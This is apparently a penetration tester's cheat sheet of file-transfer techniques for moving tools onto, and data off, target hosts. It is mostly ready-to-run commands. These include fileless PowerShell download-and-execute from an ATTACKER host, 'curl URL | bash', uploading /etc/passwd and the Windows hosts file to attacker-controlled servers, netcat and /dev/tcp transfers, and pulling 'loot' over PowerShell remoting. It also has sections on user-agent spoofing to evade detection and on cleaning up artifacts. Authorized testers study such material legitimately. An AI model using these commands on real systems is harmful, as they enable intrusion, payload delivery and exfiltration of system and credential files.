# File Transfer Methods for Penetration Testing

> **Disclaimer**
>
> Use these techniques only on systems you are authorized to assess.

# Table of Contents

-   HTTP
-   Nginx WebDAV
-   PowerShell
-   SMB
-   FTP
-   Upload Server
-   WebDAV
-   Linux Transfers
-   Netcat
-   PowerShell Remoting
-   Encryption
-   Detection Evasion
-   OPSEC
-   Troubleshooting

# Quick Decision Matrix

  Scenario             Recommended
  -------------------- -------------------------------
  Windows download     Invoke-WebRequest / WebClient
  Windows upload       SMB / WebDAV
  Linux download       wget / curl
  Linux upload         curl POST
  Large files          SMB
  AV sensitive         Fileless PowerShell
  Encrypted transfer   HTTPS UploadServer

------------------------------------------------------------------------

# HTTP / Nginx WebDAV

## Configure Nginx Upload Server

``` bash
sudo mkdir -p /var/www/uploads/SecretUploadDirectory
sudo chown -R www-data:www-data /var/www/uploads
```

`/etc/nginx/sites-available/upload.conf`

``` nginx
server {
    listen 9001;

    location /SecretUploadDirectory/ {
        root /var/www/uploads;
        dav_methods PUT;
    }
}
```

``` bash
sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
sudo systemctl restart nginx
```

### Test

``` bash
curl -T /etc/passwd http://TARGET:9001/SecretUploadDirectory/passwd
```

### Troubleshooting

``` bash
tail -f /var/log/nginx/error.log
ss -lnpt
```

# PowerShell

## Download

``` powershell
Invoke-WebRequest http://ATTACKER/file.exe -OutFile file.exe
```

``` powershell
(New-Object Net.WebClient).DownloadFile("http://ATTACKER/file.exe","file.exe")
```

## Fileless

``` powershell
IEX (New-Object Net.WebClient).DownloadString("http://ATTACKER/script.ps1")
```

## Ignore Certificate Validation

``` powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true}
```

# Detection Evasion

## Change User Agent

``` powershell
$UserAgent=[Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
Invoke-WebRequest http://ATTACKER/file.exe -UserAgent $UserAgent -OutFile file.exe
```

List available agents:

``` powershell
[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties()
```

# SMB

## Create Share

``` bash
sudo impacket-smbserver share -smb2support /tmp/smbshare
```

## Authenticated Share

``` bash
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

## Mount

``` cmd
net use n: \\ATTACKER\share /user:test test
copy n:\tool.exe
```

# FTP

## Server

``` bash
python3 -m pyftpdlib --port 21
```

## Download

``` powershell
(New-Object Net.WebClient).DownloadFile('ftp://ATTACKER/file.txt','file.txt')
```

## Upload

``` powershell
(New-Object Net.WebClient).UploadFile('ftp://ATTACKER/file','C:\Windows\System32\drivers\etc\hosts')
```

# Python Upload Server

``` bash
pip install uploadserver
python3 -m uploadserver
```

``` powershell
Invoke-FileUpload -Uri http://ATTACKER:8000/upload -File file.txt
```

# Base64

Encode:

``` bash
cat secret | base64 -w0
```

Decode:

``` bash
echo BASE64 | base64 -d > secret
```

# WebDAV

``` bash
wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

``` cmd
dir \\ATTACKER\DavWWWRoot
copy tool.exe \\ATTACKER\DavWWWRoot\
```

# Linux

``` bash
wget URL -O file
curl -o file URL
curl URL | bash
scp user@host:/tmp/file .
```

# Netcat

Receive:

``` bash
nc -l -p 8000 > tool.exe
```

Send:

``` bash
nc TARGET 8000 < tool.exe
```

Alternative:

``` bash
cat < /dev/tcp/TARGET/443 > tool.exe
```

# PowerShell Remoting

``` powershell
$Session=New-PSSession -ComputerName HOST
Copy-Item file.txt -ToSession $Session -Destination C:\Temp\
Copy-Item C:\Temp\loot.txt -FromSession $Session -Destination .
```

# Encryption

Encrypt:

``` bash
openssl enc -aes256 -iter 100000 -pbkdf2 -in file -out file.enc
```

Decrypt:

``` bash
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in file.enc -out file
```

# OPSEC

-   Prefer HTTPS.
-   Use encrypted archives.
-   Prefer fileless execution when possible.
-   Remove temporary servers after use.
-   Clean artifacts after engagements.

# References

-   Personal notes consolidated from practical labs.
